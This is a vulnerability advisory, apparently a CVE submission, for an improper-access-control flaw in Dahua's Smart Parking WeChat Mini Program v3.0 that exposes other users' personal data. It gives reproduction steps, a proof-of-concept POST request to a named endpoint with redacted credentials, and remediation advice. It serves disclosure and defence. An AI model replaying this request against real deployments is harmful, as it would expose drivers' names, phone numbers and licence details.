# Zhejiang-Dahua-Technology-Co.--Ltd.-Smart-Parking-Mini-Program-v3.0-Information-Disclosure
Logical Defect inZhejiang-Dahua-Technology-Co.,-Ltd.-Smart-Parking-Mini Program-v3.0 leads to Unauthorized Disclosure of User Personal Information

 
Vendor Identification
Vendor: Zhejiang Dahua Technology Co., Ltd. (Dahua Technology)This vulnerability exists in a WeChat Mini Program deployed in multiple enterprise scenarios.The entry can be located using common network asset search rules with unique component characteristics.Full asset location details will be provided to the CVE review team upon request.
The vendor will be identified and notified by the CVE assigning authority during the review process.
Overview
Zhejiang Dahua Technology Co., Ltd. Smart Parking Mini Program version v3.0 contains an access control vulnerability. After logging into the Mini Program, an attacker can access the user information interface without sufficient permission verification, which leads to unauthorized disclosure of users' personal information.
Vulnerability Type

    CWE-284: Improper Access Control
    CWE-863: Incorrect Authorization
    CWE-359: Exposure of Personal Information
    Vulnerability Category: Horizontal Privilege Escalation / Business Logic Flaw / Information Disclosure

Affected Versions
Zhejiang Dahua Technology Co., Ltd. Smart Parking Mini Program v3.0
Impact
An attacker can exploit this vulnerability to:

    Access and view other users' personal information without authorization
    Obtain sensitive user data including real names, phone numbers, license plate numbers and driver license information
    Cause user privacy disclosure and data security risks

Reproduction Steps

    Locate the relevant page through network asset search and scan the QR code to enter the supporting WeChat Mini Program.
    Log in to the Mini Program with a normal user account.
    Capture the HTTP request when accessing the user-related data interface.
    Send the request packet to the server.
    The server returns other users' personal information directly without valid permission control, resulting in information disclosure.

## Proof of Concept
POST /mobile/appUserCar/v1.0/getAppCarAuthList HTTP/1.1
Host: target.example.com
Content-Length: 16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf254173b) XWEB/19027
Authorization: Bearer **************************
Accept-Language: zh-CN
Xweb_xhr: 1
Content-Type: application/json
Sign-Info: ******************************************************************************
Client-Type: APPLET
Accept: */*
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://servicewechat.com/wxf447469ea85fcabf/11/page-frame.html
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

{"pageSize":100}

## Recommendation
- Add strict server-side user authentication and permission verification
- Check whether the current user has operation rights for the target user ID
- Restrict unauthorized access to other users' personal information
